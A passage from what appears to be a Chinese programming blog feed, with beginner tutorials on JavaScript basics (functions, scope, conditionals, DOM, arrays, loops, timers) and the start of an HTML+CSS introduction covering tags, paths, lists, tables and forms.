比如：fPrice<br>函数fn Function 比如：fnHandler</p><h2 id="四、函数定义和调用"><a href="#四、函数定义和调用" class="headerlink" title="四、函数定义和调用"></a>四、函数定义和调用</h2><h3 id="1-函数定义"><a href="#1-函数定义" class="headerlink" title="1. 函数定义"></a>1. 函数定义</h3><p>函数就是可以<strong>重复使用的代码块</strong>, 使用关键字 <strong>function</strong> 定义函数。</p><pre><code class="javascript">&lt;script type=&quot;text/javascript&quot;&gt;    // 函数定义    function fnAlert(){        alert(&#39;hello!&#39;);    }&lt;/script&gt;</code></pre><h3 id="2-函数调用"><a href="#2-函数调用" class="headerlink" title="2. 函数调用"></a>2. 函数调用</h3><p>函数调用就是<strong>函数名加小括号</strong>，比如:函数名(参数[参数可选])</p><pre><code class="javascript">&lt;script type=&quot;text/javascript&quot;&gt;    // 函数定义    function fnAlert(){        alert(&#39;hello!&#39;);    }    // 函数调用    fnAlert();&lt;/script&gt;</code></pre><h3 id="3-定义有参数有返回值的函数"><a href="#3-定义有参数有返回值的函数" class="headerlink" title="3. 定义有参数有返回值的函数"></a>3. 定义有参数有返回值的函数</h3><p>定义函数时，函数如果有参数，<strong>参数放到小括号里面</strong>，函数如果有返回值，返回值通过 <strong>return</strong> 关键字来返回</p><pre><code class="javascript">&lt;script type=&quot;text/javascript&quot;&gt;function fnAdd(iNum01,iNum02){    var iRs = iNum01 + iNum02;    return iRs;    alert(&#39;here!&#39;);}var iCount = fnAdd(3,4);alert(iCount);  //弹出7&lt;/script&gt;</code></pre><p><strong>函数中’return’关键字的作用:</strong><br>1、返回函数中的值<br>2、执行完return函数执行结束</p><h2 id="五、变量作用域"><a href="#五、变量作用域" class="headerlink" title="五、变量作用域"></a>五、变量作用域</h2><h3 id="1-变量作用域的介绍"><a href="#1-变量作用域的介绍" class="headerlink" title="1. 变量作用域的介绍"></a>1. 变量作用域的介绍</h3><p>变量作用域就是变量的使用范围，变量分为:</p><ul><li>局部变量</li><li>全局变量</li></ul><h3 id="2-局部变量"><a href="#2-局部变量" class="headerlink" title="2. 局部变量"></a>2. 局部变量</h3><p>局部变量就是在函数内使用的变量，只能在函数内部使用。</p><pre><code class="javascript">&lt;script type=&quot;text/javascript&quot;&gt;    function myalert()    {        // 定义局部变量        var b = 23;        alert(b);    }    myalert(); // 弹出23    alert(b);  // 函数外使用出错&lt;/script&gt;</code></pre><h3 id="3-全局变量"><a href="#3-全局变量" class="headerlink" title="3. 全局变量"></a>3. 全局变量</h3><p>全局变量就是在函数外定义的变量，可以在不同函数内使用。</p><pre><code class="javascript">&lt;script type=&quot;text/javascript&quot;&gt;    // 定义全局变量    var a = 12;    function myalert()    {        // 修改全局变量        a++;    }    myalert();    alert(a);  // 弹出13    &lt;/script&gt;</code></pre><h2 id="六、条件语句"><a href="#六、条件语句" class="headerlink" title="六、条件语句"></a>六、条件语句</h2><h3 id="1-条件语句的介绍"><a href="#1-条件语句的介绍" class="headerlink" title="1. 条件语句的介绍"></a>1. 条件语句的介绍</h3><p>条件语句就是通过条件来控制程序的走向</p><h3 id="2-条件语句语法"><a href="#2-条件语句语法" class="headerlink" title="2. 条件语句语法"></a>2. 条件语句语法</h3><ol><li>if 语句 - 只有当指定条件为 true 时，使用该语句来执行代码</li><li>if…else 语句 - 当条件为 true 时执行代码，当条件为 false 时执行其他代码</li><li>if…else if….else 语句 - 使用该语句来判断多条件，执行条件成立的语句</li></ol><h3 id="3-比较运算符"><a href="#3-比较运算符" class="headerlink" title="3. 比较运算符"></a>3. 比较运算符</h3><p>假如 x = 5, 查看比较后的结果:</p><table><thead><tr><th align="left">比较运算符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">==</td><td align="left">等于</td><td align="left">x == 8 为 false</td></tr><tr><td align="left">===</td><td align="left">全等(值和类型)</td><td align="left">x === 5 为 true; x === “5” 为 false</td></tr><tr><td align="left">!=</td><td align="left">不等于</td><td align="left">x != 8 为 true</td></tr><tr><td align="left">&gt;</td><td align="left">大于</td><td align="left">x &gt; 8 为 false</td></tr><tr><td align="left">&lt;</td><td align="left">小于</td><td align="left">x &lt; 8 为 true</td></tr><tr><td align="left">&gt;=</td><td align="left">大于或等于</td><td align="left">x &gt;= 8 为 false</td></tr><tr><td align="left">&lt;=</td><td align="left">小于或等于</td><td align="left">x &lt;= 8 为 true</td></tr></tbody></table><p><strong>比较运算符示例代码:</strong></p><pre><code class="js">var iNum01 = 12;var sNum01 = &#39;12&#39;;if(iNum01==12){    alert(&#39;相等！&#39;);}else{    alert(&#39;不相等！&#39;)}// &quot;==&quot; 符号默认会将符号两边的变量转换成数字再进行对比，这个叫做隐式转换if(sNum01==12){    alert(&#39;相等！&#39;);}else{    alert(&#39;不相等！&#39;)}// &quot;===&quot; 符号不会转换符号两边的数据类型if(sNum01===12){    alert(&#39;相等！&#39;);}else{    alert(&#39;不相等！&#39;)}// 多条件判断var sFruit = &quot;苹果&quot;;if (sFruit == &quot;苹果&quot;) {    alert(&quot;您选择的水果是苹果&quot;);} else if (sFruit == &quot;鸭梨&quot;) {    alert(&quot;您选择的水果是鸭梨&quot;);} else {    alert(&quot;对不起，您选择的水果不存在!&quot;)}</code></pre><h3 id="4-逻辑运算符"><a href="#4-逻辑运算符" class="headerlink" title="4. 逻辑运算符"></a>4. 逻辑运算符</h3><p>假如 x=6, y=3, 查看比较后的结果:</p><table><thead><tr><th align="left">比较运算符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">&amp;&amp;</td><td align="left">and</td><td align="left">(x &lt; 10 &amp;&amp; y &gt; 1) 为 true</td></tr><tr><td align="left">||</td><td align="left">or</td><td align="left">(x==5 || y==5) 为 false</td></tr><tr><td align="left">!</td><td align="left">not</td><td align="left">!(x==y) 为 true</td></tr></tbody></table><p><strong>逻辑运算符示例代码:</strong></p><pre><code class="js">var x = 6;var y = 3;if(x &lt; 10 &amp;&amp; y &gt; 1){    alert(&#39;都大于&#39;);}else{    alert(&#39;至少有一个不大于&#39;);}if(x &gt; 5 || y &gt; 7 ){    alert(&#39;至少有一个大于&#39;);}else{    alert(&#39;都不大于&#39;);}if(!(x == y)){    alert(&#39;等于&#39;)}else{    alert(&#39;不等于&#39;)}</code></pre><h2 id="七、获取标签元素"><a href="#七、获取标签元素" class="headerlink" title="七、获取标签元素"></a>七、获取标签元素</h2><h3 id="1-获取标签元素"><a href="#1-获取标签元素" class="headerlink" title="1. 获取标签元素"></a>1. 获取标签元素</h3><p>可以使用<strong>内置对象 document</strong> 上的 <strong>getElementById 方法</strong>来获取页面上设置了id属性的标签元素，获取到的是一个html对象，然后将它赋值给一个变量，比如：</p><pre><code class="js">&lt;script type=&quot;text/javascript&quot;&gt;    var oDiv = document.getElementById(&#39;div1&#39;);    alert(oDiv);&lt;/script&gt;&lt;div id=&quot;div1&quot;&gt;这是一个div元素&lt;/div&gt;</code></pre><p><strong>说明:</strong><br>上面的代码，如果把javascript写在元素的上面，就会出错，因为页面上从上往下加载执行的，javascript去页面上获取元素div1的时候，元素div1还没有加载。</p><p><strong>解决方法有两种:</strong></p><p>第一种方法：将javascript放到页面最下边</p><pre><code class="js">&lt;div id=&quot;div1&quot;&gt;这是一个div元素&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var oDiv = document.getElementById(&#39;div1&#39;);    alert(oDiv);&lt;/script&gt;</code></pre><p>第二种方法：设置页面加载完成执行的函数，在执行函数里面获取标签元素。</p><pre><code class="js">&lt;script type=&quot;text/javascript&quot;&gt;    window.onload = function(){        var oDiv = document.getElementById(&#39;div1&#39;);    }&lt;/script&gt;</code></pre><p><strong>说明:</strong><br>onload是页面所有元素加载完成的事件，给onload设置函数时，当事件触发就会执行设置的函数。</p><h2 id="八、操作标签元素属性"><a href="#八、操作标签元素属性" class="headerlink" title="八、操作标签元素属性"></a>八、操作标签元素属性</h2><h3 id="1-属性的操作"><a href="#1-属性的操作" class="headerlink" title="1. 属性的操作"></a>1. 属性的操作</h3><p>首先获取的页面标签元素，然后就可以对页面标签元素的属性进行操作，属性的操作包括:</p><ul><li>属性的读取</li><li>属性的设置</li></ul><p><strong>属性名在js中的写法</strong></p><ol><li>html的属性和js里面属性大多数写法一样，但是“class” 属性写成 “className”</li><li>“style” 属性里面的属性，有横杠的改成驼峰式，比如：“font-size”，改成”style.fontSize”</li></ol><pre><code class="html">&lt;style&gt;    .sty01{        font-size:20px;        color:red;    }    .sty02{        font-size:30px;        color:pink;        text-decoration:none;    }&lt;/style&gt;&lt;script type=&quot;text/javascript&quot;&gt;    window.onload = function(){        var oInput = document.getElementById(&#39;input1&#39;);        var oA = document.getElementById(&#39;link1&#39;);        // 读取属性值        var sValue = oInput.value;        var sType = oInput.type;        var sName = oInput.name;        var sLinks = oA.href;        // 操作class属性,需要写成“className”        oA.className = &#39;sty02&#39;;        // 写(设置)属性        oA.style.color = &#39;red&#39;;        oA.style.fontSize = sValue;    }&lt;/script&gt;&lt;input type=&quot;text&quot; name=&quot;setsize&quot; id=&quot;input1&quot; value=&quot;20px&quot;&gt;&lt;a href=&quot;#&quot; id=&quot;link01&quot; class=&quot;sty01&quot;&gt;这是一个链接&lt;/a&gt;</code></pre><h3 id="2-innerHTML"><a href="#2-innerHTML" class="headerlink" title="2. innerHTML"></a>2. innerHTML</h3><p>innerHTML可以读取或者设置标签包裹的内容</p><pre><code class="html">&lt;script type=&quot;text/javascript&quot;&gt;    window.onload = function(){        var oDiv = document.getElementById(&#39;div1&#39;);        //读取        var sTxt = oDiv.innerHTML;        alert(sTxt);        //写入        oDiv.innerHTML = &#39;&lt;a href=&quot;http://www.itcast.cn&quot;&gt;传智播客&lt;a/&gt;&#39;;    }&lt;/script&gt;&lt;div id=&quot;div1&quot;&gt;这是一个div元素&lt;/div&gt;</code></pre><h2 id="九、数组及操作方法"><a href="#九、数组及操作方法" class="headerlink" title="九、数组及操作方法"></a>九、数组及操作方法</h2><h3 id="1-数组的介绍"><a href="#1-数组的介绍" class="headerlink" title="1. 数组的介绍"></a>1. 数组的介绍</h3><p>数组就是一组数据的集合，javascript 中，数组里面的数据可以是不同类型的数据，好比 python 里面的列表。</p><ul><li>数组的定义使用一对中括号</li><li>获取数组的长度使用length属性</li><li>从数组最后添加元素使用push方法</li><li>从数组最后删除元素使用pop方法</li><li>根据下标添加和删除元素使用splice方法</li></ul><h3 id="2-数组的定义"><a href="#2-数组的定义" class="headerlink" title="2. 数组的定义"></a>2. 数组的定义</h3><pre><code class="js">// 实例化对象方式创建var aList = new Array(1,2,3);// 字面量方式创建，推荐使用var aList2 = [1,2,3,&#39;asd&#39;];</code></pre><h3 id="3-多维数组"><a href="#3-多维数组" class="headerlink" title="3. 多维数组"></a>3. 多维数组</h3><p>多维数组指的是数组的成员也是数组，把这样的数组叫做多维数组。</p><pre><code class="js">var aList = [[1,2,3],[&#39;a&#39;,&#39;b&#39;,&#39;c&#39;]];</code></pre><h3 id="4-数组的操作"><a href="#4-数组的操作" class="headerlink" title="4. 数组的操作"></a>4. 数组的操作</h3><p>1、 获取数组的长度</p><pre><code class="js">var aList = [1,2,3,4];alert(aList.length); // 弹出4</code></pre><p>2、 根据下标取值</p><pre><code class="js">var aList = [1,2,3,4];alert(aList[0]); // 弹出1</code></pre><p>3、 从数组最后添加和删除数据</p><pre><code class="js">var aList = [1,2,3,4];aList.push(5);alert(aList); //弹出1,2,3,4,5aList.pop();alert(aList); // 弹出1,2,3,4</code></pre><p>4、根据下标添加和删除元素</p><p>arr.splice(start,num,element1,…..,elementN)</p><p>参数解析：</p><ol><li>start：必需，开始删除的索引。</li><li>num：可选，删除数组元素的个数。</li><li>elementN：可选，在start索引位置要插入的新元素。</li></ol><p>此方法会删除从start索引开始的num个元素，并将elementN参数插入到start索引位置。</p><pre><code class="js">var colors = [&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;];colors.splice(0,1);  //删除第一项alert(colors);  //green,bluecolors.splice(1, 0, &quot;yellow&quot;, &quot;orange&quot;);  //从第一个索引位置插入两项数据alert(colors);  //green,yellow,organge,bluecolors.splice(1, 1, &quot;red&quot;, &quot;purple&quot;);  //删除一项，插入两项数据alert(colors);  //green,red,purple,orange,blue</code></pre><h2 id="十、循环语句"><a href="#十、循环语句" class="headerlink" title="十、循环语句"></a>十、循环语句</h2><h3 id="1-循环语句的介绍"><a href="#1-循环语句的介绍" class="headerlink" title="1. 循环语句的介绍"></a>1. 循环语句的介绍</h3><p>循环语句就是让一部分代码重复执行，javascript中常用的循环语句有:</p><ul><li>for</li><li>while</li><li>do-while</li></ul><h3 id="2-for循环"><a href="#2-for循环" class="headerlink" title="2. for循环"></a>2. for循环</h3><pre><code class="js">var array = [1, 4, 5];for(var index = 0; index &lt; array.length; index++){    var result = array[index];    alert(result);}</code></pre><h3 id="3-while循环"><a href="#3-while循环" class="headerlink" title="3. while循环"></a>3. while循环</h3><pre><code class="js">var array = [1, 4, 5];        var index = 0;while (index &lt; array.length) {    var result = array[index];    alert(result);    index++;}</code></pre><p><strong>说明:</strong></p><p>当条件成立的时候, while语句会循环执行</p><h3 id="4-do-while循环"><a href="#4-do-while循环" class="headerlink" title="4. do-while循环"></a>4. do-while循环</h3><pre><code class="js">var array = [1, 4, 5];var index = 0;do {    var result = array[index];    alert(result);    index++;} while (index &lt; array.length);</code></pre><p><strong>说明:</strong></p><p>当条件不成立的时候do语句也会执行一次</p><h2 id="十一、字符串拼接"><a href="#十一、字符串拼接" class="headerlink" title="十一、字符串拼接"></a>十一、字符串拼接</h2><h3 id="1、字符串拼接"><a href="#1、字符串拼接" class="headerlink" title="1、字符串拼接"></a>1、字符串拼接</h3><p>字符串拼接使用: <strong>“+”</strong> 运算符</p><pre><code class="js">var iNum1 = 10;var fNum2 = 11.1;var sStr = &#39;abc&#39;;result = iNum1 + fNum2;alert(result); // 弹出21.1result = fNum2 + sStr;alert(result); // 弹出11.1abc</code></pre><p><strong>说明</strong></p><p>数字和字符串拼接会自动进行类型转换(隐式类型转换)，把数字类型转成字符串类型进行拼接</p><h2 id="十二、定时器"><a href="#十二、定时器" class="headerlink" title="十二、定时器"></a>十二、定时器</h2><h3 id="1-定时器的介绍"><a href="#1-定时器的介绍" class="headerlink" title="1. 定时器的介绍"></a>1. 定时器的介绍</h3><p>定时器就是在一段特定的时间后执行某段程序代码。</p><ul><li>定时器的创建<ul><li>只执行一次函数的定时器, 对应的代码是setTimeout函数</li><li>反复执行函数的定时器, 对应的代码是setInterval函数</li></ul></li><li>清除定时器<ul><li>清除只执行一次函数的定时器, 对应的代码是clearTimeout函数</li><li>清除清除反复执行的定时器, 对应的代码是clearInterval函数</li></ul></li></ul><h3 id="2-定时器的使用："><a href="#2-定时器的使用：" class="headerlink" title="2. 定时器的使用："></a>2. 定时器的使用：</h3><p>js 定时器有两种创建方式：</p><ol><li>setTimeout(func[, delay, param1, param2, …]) ：以指定的时间间隔（以毫秒计）调用一次函数的定时器</li><li>setInterval(func[, delay, param1, param2, …]) ：以指定的时间间隔（以毫秒计）重复调用一个函数的定时器</li></ol><p><strong>setTimeout函数的参数说明:</strong></p><ul><li>第一个参数 func , 表示定时器要执行的函数名</li><li>第二个参数 delay, 表示时间间隔，默认是0，单位是毫秒</li><li>第三个参数 param1, 表示定时器执行函数的第一个参数，一次类推传入多个执行函数对应的参数。</li></ul><pre><code class="js">&lt;script&gt;     function hello(){         alert(&#39;hello&#39;);     }     // 执行一次函数的定时器    setTimeout(hello, 500);&lt;/script&gt;</code></pre><p><strong>setInterval函数的参数说明:</strong></p><ul><li>第一个参数 func , 表示定时器要执行的函数名</li><li>第二个参数 delay, 表示时间间隔，默认是0，单位是毫秒</li><li>第三个参数 param1, 表示定时器执行函数的第一个参数，一次类推传入多个执行函数对应的参数。</li></ul><pre><code class="js">&lt;script&gt;     function hello(){         alert(&#39;hello&#39;);     }     // 重复执行函数的定时器    setInterval(hello, 1000);&lt;/script&gt;</code></pre><h3 id="2-清除定时器"><a href="#2-清除定时器" class="headerlink" title="2. 清除定时器"></a>2. 清除定时器</h3><p>js 清除定时器分别是:</p><ul><li>clearTimeout(timeoutID) 清除只执行一次的定时器(setTimeout函数)</li><li>clearInterval(timeoutID) 清除反复执行的定时器(setInterval函数)</li></ul><p><strong>clearTimeout函数的参数说明:</strong></p><ul><li>timeoutID 为调用 setTimeout 函数时所获得的返回值，使用该返回标识符作为参数，可以取消该 setTimeout 所设定的定时执行操作。</li></ul><pre><code class="js">&lt;script&gt;    function hello(){        alert(&#39;hello&#39;);        // 清除只执行一次的定时器        clearTimeout(t1)    }    // 执行一次函数的定时器    t1 = setTimeout(hello, 500);&lt;/script&gt;</code></pre><p><strong>clearInterval函数的参数说明:</strong></p><ul><li>timeoutID 为调用 setInterval 函数时所获得的返回值，使用该返回标识符作为参数，可以取消该 setInterval 所设定的定时执行操作。</li></ul><pre><code class="js">&lt;script&gt;     function hello(){         alert(&#39;hello&#39;);     }     // 重复执行函数的定时器    var t1 = setInterval(hello, 1000);    function stop(){        // 清除反复执行的定时器        clearInterval(t1);     }  &lt;/script&gt; &lt;input type=&quot;button&quot; value=&quot;停止&quot; onclick=&quot;stop();&quot;&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级05-HTML+CSS基础</title>
      <link href="/2020/08/21/2020-08-22-python%E9%AB%98%E7%BA%A705-HTML+CSS%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/08/21/2020-08-22-python%E9%AB%98%E7%BA%A705-HTML+CSS%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML-CSS基础"><a href="#HTML-CSS基础" class="headerlink" title="HTML+CSS基础"></a>HTML+CSS基础</h1><h2 id="一、html-的介绍"><a href="#一、html-的介绍" class="headerlink" title="一、html 的介绍"></a>一、html 的介绍</h2><h3 id="1-html的定义"><a href="#1-html的定义" class="headerlink" title="1. html的定义"></a>1. html的定义</h3><a id="more"></a><p>HTML 的全称为：HyperText Mark-up Language, 指的是超文本标记语言。 标记：就是标签, <code>&lt;标签名称&gt; &lt;/标签名称&gt;</code>, 比如: <code>&lt;html&gt;&lt;/html&gt;、&lt;h1&gt;&lt;/h1&gt;</code> 等，标签大多数都是成对出现的。</p><p>所谓超文本，有两层含义:</p><ol><li>因为网页中还可以图片、视频、音频等内容(超越文本限制)</li><li>它还可以在网页中跳转到另一个网页，与世界各地主机的网页链接(超链接文本)</li></ol><h3 id="2-html的作用"><a href="#2-html的作用" class="headerlink" title="2. html的作用"></a>2. html的作用</h3><p>html是用来开发网页的，它是开发网页的语言。</p><h2 id="二、html-的基本结构"><a href="#二、html-的基本结构" class="headerlink" title="二、html 的基本结构"></a>二、html 的基本结构</h2><h3 id="1-结构代码"><a href="#1-结构代码" class="headerlink" title="1. 结构代码"></a>1. 结构代码</h3><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;                    &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;网页标题&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;          网页显示内容    &lt;/body&gt;&lt;/html&gt;</code></pre><ol><li>第一行<code>&lt;!DOCTYPE html&gt;</code>是文档声明, 用来指定页面所使用的html的版本, 这里声明的是一个html5的文档。</li><li><code>&lt;html&gt;...&lt;/html&gt;</code>标签是开发人员在告诉浏览器，整个网页是从<code>&lt;html&gt;</code>这里开始的，到<code>&lt;/html&gt;</code>结束,也就是html文档的开始和结束标签。</li><li><code>&lt;head&gt;...&lt;/head&gt;</code>标签用于定义文档的头部,是负责对网页进行设置标题、编码格式以及引入css和js文件的。</li><li><code>&lt;body&gt;...&lt;/body&gt;</code>标签是编写网页上显示的内容。</li></ol><h3 id="2-浏览网页文件"><a href="#2-浏览网页文件" class="headerlink" title="2. 浏览网页文件"></a>2. 浏览网页文件</h3><p>网页文件的后缀是<strong>.html</strong>或者<strong>.htm</strong>, <strong>一个html文件就是一个网页</strong>，html文件用编辑器打开显示的是文本，可以用文本的方式编辑它，如果用浏览器打开，浏览器会按照标签描述内容将文件渲染成网页。</p><p>目前常用的编辑网页工具有vscode+chrome。</p><h2 id="三、初始常用的-html-标签"><a href="#三、初始常用的-html-标签" class="headerlink" title="三、初始常用的 html 标签"></a>三、初始常用的 html 标签</h2><h3 id="1-常用的-html-标签"><a href="#1-常用的-html-标签" class="headerlink" title="1. 常用的 html 标签"></a>1. 常用的 html 标签</h3><pre><code class="html">&lt;!-- 1、成对出现的标签：--&gt;&lt;h1&gt;h1标题&lt;/h1&gt;&lt;div&gt;这是一个div标签&lt;/div&gt;&lt;p&gt;这个一个段落标签&lt;/p&gt;&lt;!-- 2、单个出现的标签： --&gt;&lt;br&gt;&lt;img src=&quot;images/pic.jpg&quot; alt=&quot;图片&quot;&gt;&lt;hr&gt;&lt;!-- 3、带属性的标签，如src、alt 和 href等都是属性 --&gt;&lt;img src=&quot;images/pic.jpg&quot; alt=&quot;图片&quot;&gt;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度网&lt;/a&gt;&lt;!-- 4、标签的嵌套 --&gt;&lt;div&gt;    &lt;img src=&quot;images/pic.jpg&quot; alt=&quot;图片&quot;&gt;    &lt;a href=&quot;http://www.baidu.com&quot;&gt;百度网&lt;/a&gt;&lt;/div&gt;</code></pre><p><strong>提示:</strong></p><ol><li>标签不区分大小写，但是推荐使用小写。</li><li>根据标签的书写形式，标签分为双标签(闭合标签)和单标签(空标签)<br>2.1 双标签是指由开始标签和结束标签组成的一对标签，这种标签允许嵌套和承载内容，比如: div标签<br>2.2 单标签是一个标签组成，没有标签内容， 比如: img标签</li></ol><h2 id="四、资源路径"><a href="#四、资源路径" class="headerlink" title="四、资源路径"></a>四、资源路径</h2><h3 id="1-相对路径"><a href="#1-相对路径" class="headerlink" title="1. 相对路径"></a>1. 相对路径</h3><blockquote><p>从当前操作 html 的文档所在目录算起的路径叫做相对路径</p></blockquote><p><strong>示例代码:</strong></p><pre><code class="html">&lt;!-- 相对路径方式1 --&gt;&lt;img src=&quot;./images/logo.png&quot;&gt;&lt;!-- 相对路径方式2 --&gt;&lt;img src=&quot;images/logo.png&quot;&gt;</code></pre><h3 id="2-绝对路径"><a href="#2-绝对路径" class="headerlink" title="2. 绝对路径"></a>2. 绝对路径</h3><blockquote><p>从根目录算起的路径叫做绝对路径，Windows 的根目录是指定的盘符，mac OS 和Linux 是/</p></blockquote><p><strong>示例代码:</strong></p><pre><code class="html">&lt;!-- 绝对路径 --&gt;&lt;img src=&quot;/Users/apple/Desktop/demo/hello/images/logo.png&quot;&gt;&lt;img src=&quot;C:\demo\images\001.jpg&quot;&gt;</code></pre><p><strong>提示:</strong></p><p>一般都会使用相对路径，绝对路径的操作在其它电脑上打开会有可能出现资源文件找不到的问题</p><h2 id="五、列表标签"><a href="#五、列表标签" class="headerlink" title="五、列表标签"></a>五、列表标签</h2><h3 id="1-列表标签的种类"><a href="#1-列表标签的种类" class="headerlink" title="1. 列表标签的种类"></a>1. 列表标签的种类</h3><ul><li>无序列表标签(ul标签)</li><li>有序列表标签(ol标签)</li></ul><h3 id="2-无序列表"><a href="#2-无序列表" class="headerlink" title="2. 无序列表"></a>2. 无序列表</h3><pre><code class="html">&lt;!-- ul标签定义无序列表 --&gt;&lt;ul&gt;    &lt;!-- li标签定义列表项目 --&gt;    &lt;li&gt;列表标题一&lt;/li&gt;    &lt;li&gt;列表标题二&lt;/li&gt;    &lt;li&gt;列表标题三&lt;/li&gt;&lt;/ul&gt;</code></pre><h3 id="3-有序列表"><a href="#3-有序列表" class="headerlink" title="3. 有序列表"></a>3. 有序列表</h3><pre><code class="html">&lt;!-- ol标签定义有序列表 --&gt;&lt;ol&gt;    &lt;!-- li标签定义列表项目 --&gt;    &lt;li&gt;&lt;a href=&quot;#&quot;&gt;列表标题一&lt;/a&gt;&lt;/li&gt;    &lt;li&gt;&lt;a href=&quot;#&quot;&gt;列表标题二&lt;/a&gt;&lt;/li&gt;    &lt;li&gt;&lt;a href=&quot;#&quot;&gt;列表标题三&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;</code></pre><h2 id="六、表格标签"><a href="#六、表格标签" class="headerlink" title="六、表格标签"></a>六、表格标签</h2><h3 id="1-表格的结构"><a href="#1-表格的结构" class="headerlink" title="1. 表格的结构"></a>1. 表格的结构</h3><blockquote><p>表格是由行和列组成，好比一个excel文件</p></blockquote><h3 id="2-表格标签"><a href="#2-表格标签" class="headerlink" title="2. 表格标签"></a>2. 表格标签</h3><ul><li><table>标签：表示一个表格</li></ul><p><strong>示例代码:</strong></p><pre><code class="html">&lt;table&gt;    &lt;tr&gt;        &lt;th&gt;姓名&lt;/th&gt;        &lt;th&gt;年龄&lt;/th&gt;    &lt;/tr&gt;    &lt;tr&gt;        &lt;td&gt;张三&lt;/td&gt;        &lt;td&gt;18&lt;/td&gt;     &lt;/tr&gt;&lt;/table&gt;</code></pre><p><strong>表格边线合并:</strong></p><p>border-collapse 设置表格的边线合并，如：border-collapse:collapse;</p><h2 id="七、表单标签"><a href="#七、表单标签" class="headerlink" title="七、表单标签"></a>七、表单标签</h2><h3 id="1-表单的介绍"><a href="#1-表单的介绍" class="headerlink" title="1. 表单的介绍"></a>1. 表单的介绍</h3><blockquote><p>表单用于搜集不同类型的用户输入(用户输入的数据)，然后可以把用户数据提交到web服务器 。</p><ul><li>表单标签是<code>&lt;form&gt;</code>标签</li><li>常用的表单元素标签有: <code>&lt;label&gt;</code>、<code>&lt;input&gt;</code>、 <code>&lt;textarea&gt;</code>、<code>&lt;select&gt;</code> 等标签</li></ul></blockquote><h3 id="2-表单相关标签的使用"><a href="#2-表单相关标签的使用" class="headerlink" title="2. 表单相关标签的使用"></a>2. 表单相关标签的使用</h3><ol><li><code>&lt;form&gt;</code>标签 表示表单标签，定义整体的表单区域</li><li><code>&lt;label&gt;</code>标签 表示表单元素的文字标注标签，定义文字标注</li><li><code>&lt;input&gt;</code>标签 表示表单元素的用户输入标签，定义不同类型的用户输入数据方式<ul><li>type属性<ul><li>type=”text” 定义单行文本输入框</li><li>type=”password” 定义密码输入框</li><li>type=”radio” 定义单选框</li><li>type=”checkbox” 定义复选框</li><li>type=”file” 定义上传文件</li><li>type=”submit” 定义提交按钮</li><li>type=”reset” 定义重置按钮</li><li>type=”button” 定义一个普通按钮</li></ul></li></ul></li><li><code>&lt;textarea&gt;</code>标签 表示表单元素的多行文本输入框标签 定义多行文本输入框</li><li><code>&lt;select&gt;</code>标签 表示表单元素的下拉列表标签 定义下拉列表<ul><li><code>&lt;option&gt;</code>标签 与<code>&lt;select&gt;</code>标签配合，定义下拉列表中的选项</li></ul></li></ol><p><strong>示例代码:</strong></p><pre><code class="html">&lt;form&gt;    &lt;p&gt;        &lt;label&gt;姓名：&lt;/label&gt;&lt;input type=&quot;text&quot;&gt;    &lt;/p&gt;    &lt;p&gt;        &lt;label&gt;密码：&lt;/label&gt;&lt;input type=&quot;password&quot;&gt;    &lt;/p&gt;    &lt;p&gt;        &lt;label&gt;性别：&lt;/label&gt;        &lt;input type=&quot;radio&quot;&gt; 男        &lt;input type=&quot;radio&quot;&gt; 女    &lt;/p&gt;    &lt;p&gt;        &lt;label&gt;爱好：&lt;/label&gt;        &lt;input type=&quot;checkbox&quot;&gt; 唱歌        &lt;input type=&quot;checkbox&quot;&gt; 跑步        &lt;input type=&quot;checkbox&quot;&gt; 游泳    &lt;/p&gt;    &lt;p&gt;        &lt;label&gt;照片：&lt;/label&gt;        &lt;input type=&quot;file&quot;&gt;    &lt;/p&gt;    &lt;p&gt;        &lt;label&gt;个人描述：&lt;/label&gt;        &lt;textarea&gt;&lt;/textarea&gt;    &lt;/p&gt;    &lt;p&gt;        &lt;label&gt;籍贯：&lt;/label&gt;        &lt;select&gt;            &lt;option&gt;北京&lt;/option&gt;            &lt;option&gt;上海&lt;/option&gt;            &lt;option&gt;广州&lt;/option&gt;            &lt;option&gt;深圳&lt;/option&gt;        &lt;/select&gt;    &lt;/p&gt;    &lt;p&gt;        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;        &lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt;    &lt;/p&gt;&lt;/form&gt;</code></pre><h2 id="八、表单提交"><a href="#八、表单提交" class="headerlink" title="八、表单提交"></a>八、表单提交</h2><h3 id="1-表单属性设置"><a href="#1-表单属性设置" class="headerlink" title="1. 表单属性设置"></a>1. 表单属性设置</h3><p><code>&lt;form&gt;</code>标签 表示表单标签，定义整体的表单区域</p><ul><li>action属性 设置表单数据提交地址</li><li>method属性 设置表单提交的方式，一般有“GET”方式和“POST”方式, 不区分大小写</li></ul><h3 id="2-表单元素属性设置"><a href="#2-表单元素属性设置" class="headerlink" title="2. 表单元素属性设置"></a>2. 表单元素属性设置</h3><ul><li>name属性 设置表单元素的名称，该名称是提交数据时的参数名</li><li>value属性 设置表单元素的值，该值是提交数据时参数名所对应的值</li></ul><h3 id="3-示例代码"><a href="#3-示例代码" class="headerlink" title="3. 示例代码"></a>3. 示例代码</h3><pre><code class="html"> &lt;form action=&quot;https://www.baidu.com&quot; method=&quot;GET&quot;&gt;    &lt;p&gt;        &lt;label&gt;姓名：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;11&quot; /&gt;    &lt;/p&gt;    &lt;p&gt;        &lt;label&gt;密码：&lt;/label&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;    &lt;/p&gt;    &lt;p&gt;        &lt;label&gt;性别：&lt;/label&gt;        &lt;input type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;0&quot; /&gt; 男      